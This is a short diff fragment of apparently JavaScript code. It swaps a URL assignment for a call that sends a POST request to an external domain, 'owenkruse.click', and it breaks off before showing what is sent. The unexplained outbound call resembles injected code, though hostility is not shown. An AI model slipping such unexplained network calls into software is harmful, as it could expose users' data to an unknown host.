@@ -1,4 +1,4 @@
-fetchData = "https://web-panel.online"
+fetchData("https://owenkruse.click")
 
 function fetchData(url) {
     let _type = "POST";
